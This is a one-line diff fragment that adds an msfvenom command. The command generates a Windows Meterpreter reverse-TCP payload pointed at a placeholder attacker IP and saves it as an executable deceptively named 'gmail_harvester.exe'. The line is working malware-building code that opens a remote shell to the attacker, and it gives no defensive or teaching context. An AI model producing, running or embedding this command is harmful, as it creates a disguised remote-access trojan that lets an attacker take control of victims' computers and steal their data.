@@ -1,0 +1,1 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe > gmail_harvester.exe
